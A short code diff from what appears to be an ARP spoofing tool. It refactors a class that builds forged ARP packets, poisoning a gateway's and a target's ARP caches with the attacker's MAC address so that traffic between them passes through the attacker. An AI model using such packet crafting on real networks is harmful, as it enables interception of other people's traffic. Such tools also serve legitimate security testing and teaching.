@@ -13,6 +13,9 @@ from protocols import ARP, Ethernet, Packet
 
 
 class ARPAttackPackets(object):
+
+    ARP_ETHERTYPE = 0x0806  # IEEE 802.3
+
     def __init__(self, attacker_mac: str, gateway_ip: str, gateway_mac: str,
                  target_ip: str, target_mac: str):
         self.attacker_mac = attacker_mac
@@ -28,7 +31,7 @@ class ARPAttackPackets(object):
     @property
     def payload_to_gateway(self):
         gateway = Packet(Ethernet(dst=self.gateway_mac, src=self.attacker_mac,
-                                  eth=0x0806),
+                                  eth=self.ARP_ETHERTYPE),
                          ARP(sha=self.attacker_mac, spa=self.target_ip,
                              tha=self.gateway_mac, tpa=self.gateway_ip))
         return gateway.payload
@@ -36,7 +39,7 @@ class ARPAttackPackets(object):
     @property
     def payload_to_target(self):
         target = Packet(Ethernet(dst=self.target_mac, src=self.attacker_mac,
-                                 eth=0x0806),
+                                 eth=self.ARP_ETHERTYPE),
                         ARP(sha=self.attacker_mac, spa=self.gateway_ip,
                             tha=self.target_mac, tpa=self.target_ip))
         return target.payload
